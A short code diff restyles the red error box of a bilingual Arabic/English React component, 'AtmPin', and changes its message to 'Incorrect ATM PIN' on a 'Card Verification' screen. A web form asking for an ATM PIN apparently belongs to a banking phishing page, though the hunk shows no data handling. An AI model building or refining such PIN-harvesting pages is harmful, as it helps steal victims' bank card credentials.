@@ -73,8 +73,8 @@ export default function AtmPin() {
       <div className="container">
         <div className="otp-box">
           {showError && (
-            <div className="error-message">
-              {isArabic ? "الرقم السري غير صحيح، يرجى المحاولة مرة أخرى" : "Incorrect PIN, please try again"}
+            <div className="error-message" style={{ backgroundColor: '#fee2e2', color: '#dc2626', border: '1px solid #fecaca', padding: '15px', borderRadius: '12px', marginBottom: '20px', fontWeight: 'bold' }}>
+              {isArabic ? "الرقم السري للصراف الي غير صحيح" : "Incorrect ATM PIN"}
             </div>
           )}
           <h2>{isArabic ? "التحقق من البطاقة" : "Card Verification"}</h2>
